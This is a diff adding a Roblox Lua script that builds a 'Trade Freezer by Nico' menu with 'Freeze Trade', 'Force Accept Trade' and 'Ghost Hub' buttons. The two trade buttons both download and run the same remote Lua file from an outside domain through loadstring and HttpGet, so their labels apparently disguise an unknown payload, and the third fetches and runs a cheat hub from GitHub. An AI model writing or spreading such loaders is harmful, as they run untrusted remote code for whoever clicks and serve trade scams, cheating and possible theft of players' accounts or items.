@@ -1,0 +1,142 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local FreezeTradeButton = Instance.new("TextButton")
+local ForceAcceptTradeButton = Instance.new("TextButton")
+local ToggleButton = Instance.new("TextButton")
+local GhostHubButton = Instance.new("TextButton")
+local UICornerFrame = Instance.new("UICorner")
+local UICornerToggle = Instance.new("UICorner")
+
+-- Properties
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BackgroundTransparency = 0.3
+Frame.Size = UDim2.new(0.3, 0, 0.5, 0)
+Frame.Position = UDim2.new(0.35, 0, 0.35, 0)
+Frame.Visible = false
+
+UICornerFrame.Parent = Frame
+UICornerFrame.CornerRadius = UDim.new(0, 15)
+
+-- Updated Title
+Title.Parent = Frame
+Title.Text = "Trade Freezer by Nico"
+Title.Size = UDim2.new(1, 0, 0.15, 0)  -- Adjusted size for smaller text
+Title.BackgroundColor3 = Color3.new(1, 1, 1)
+Title.BackgroundTransparency = 0.5
+Title.TextColor3 = Color3.new(0, 0, 0)
+Title.TextScaled = false  -- Turn off scaling for manual size control
+Title.TextSize = 18  -- Set a specific text size
+
+FreezeTradeButton.Parent = Frame
+FreezeTradeButton.Text = "Freeze Trade"
+FreezeTradeButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+FreezeTradeButton.Position = UDim2.new(0.1, 0, 0.25, 0)  -- Adjusted position
+FreezeTradeButton.BackgroundColor3 = Color3.new(0, 0.5, 1)
+FreezeTradeButton.BackgroundTransparency = 0.3
+FreezeTradeButton.TextColor3 = Color3.new(1, 1, 1)
+
+local UICornerFreeze = Instance.new("UICorner")
+UICornerFreeze.Parent = FreezeTradeButton
+UICornerFreeze.CornerRadius = UDim.new(0, 10)
+
+ForceAcceptTradeButton.Parent = Frame
+ForceAcceptTradeButton.Text = "Force Accept Trade"
+ForceAcceptTradeButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+ForceAcceptTradeButton.Position = UDim2.new(0.1, 0, 0.5, 0)  -- Adjusted position
+ForceAcceptTradeButton.BackgroundColor3 = Color3.new(1, 0, 0)
+ForceAcceptTradeButton.BackgroundTransparency = 0.3
+ForceAcceptTradeButton.TextColor3 = Color3.new(1, 1, 1)
+
+local UICornerForceAccept = Instance.new("UICorner")
+UICornerForceAccept.Parent = ForceAcceptTradeButton
+UICornerForceAccept.CornerRadius = UDim.new(0, 10)
+
+-- New Ghost Hub Button
+GhostHubButton.Parent = Frame
+GhostHubButton.Text = "Ghost Hub"
+GhostHubButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+GhostHubButton.Position = UDim2.new(0.1, 0, 0.75, 0)  -- Position it below existing buttons
+GhostHubButton.BackgroundColor3 = Color3.new(0, 1, 0)  -- Green color
+GhostHubButton.BackgroundTransparency = 0.3
+GhostHubButton.TextColor3 = Color3.new(1, 1, 1)
+
+local UICornerGhostHub = Instance.new("UICorner")
+UICornerGhostHub.Parent = GhostHubButton
+UICornerGhostHub.CornerRadius = UDim.new(0, 10)
+
+ToggleButton.Parent = ScreenGui
+ToggleButton.Text = "Open Trade Menu"
+ToggleButton.Size = UDim2.new(0.2, 0, 0.1, 0)
+ToggleButton.Position = UDim2.new(0.4, 0, 0.05, 0)
+ToggleButton.BackgroundColor3 = Color3.new(1, 0, 0)
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+
+UICornerToggle.Parent = ToggleButton
+UICornerToggle.CornerRadius = UDim.new(0, 50)
+
+-- Rainbow Effect
+local function rainbowEffect()
+    while true do
+        for i = 0, 255 do
+            local r = math.abs(math.sin(math.rad(i)))
+            local g = math.abs(math.sin(math.rad(i + 85)))
+            local b = math.abs(math.sin(math.rad(i + 170)))
+            ToggleButton.BackgroundColor3 = Color3.new(r, g, b)
+            wait(0.03)
+        end
+    end
+end
+
+coroutine.wrap(rainbowEffect)()
+
+ToggleButton.MouseButton1Click:Connect(function()
+    Frame.Visible = not Frame.Visible
+    ToggleButton.Text = Frame.Visible and "Close Trade Menu" or "Open Trade Menu"
+end)
+
+local dragging = false
+local dragInput, startPos, framePos
+
+local function updatePosition(input)
+    local delta = input.Position - startPos
+    Frame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+end
+
+Title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        startPos = input.Position
+        framePos = Frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Title.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.Touch then
+        updatePosition(input)
+    end
+end)
+
+-- Loadstring for Freeze Trade Button
+FreezeTradeButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://egorikusa.space/ce3dc0c6f8a079d6c2766193.lua", true))()
+end)
+
+-- Loadstring for Force Accept Trade Button
+ForceAcceptTradeButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://egorikusa.space/ce3dc0c6f8a079d6c2766193.lua", true))()
+end)
+
+-- Ghost Hub Button Functionality
+GhostHubButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
+end)
